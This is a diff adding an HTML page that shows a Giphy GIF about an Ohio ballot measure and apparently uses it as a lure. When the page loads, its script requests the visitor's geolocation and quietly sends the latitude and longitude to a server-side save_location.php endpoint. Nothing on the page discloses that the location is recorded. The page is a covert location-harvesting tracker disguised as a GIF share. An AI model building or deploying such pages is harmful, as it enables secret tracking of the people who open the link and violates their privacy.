@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+    <<iframe src="https://giphy.com/embed/6YE87pn50tBvagbXkQ" width="480" height="260" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/news-ohio-issue-1-ballot-measure-6YE87pn50tBvagbXkQ">via GIPHY</a></p>>
+
+
+<p id="demo"></p>
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET","save_location.php?lat="+position.coords.latitude + "&long="+ position.coords.longitude + "&user_agent=:");
+    xhttp.send();
+
+    
+  x.innerHTML = "Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude;
+}
+</script>
+
+</body>
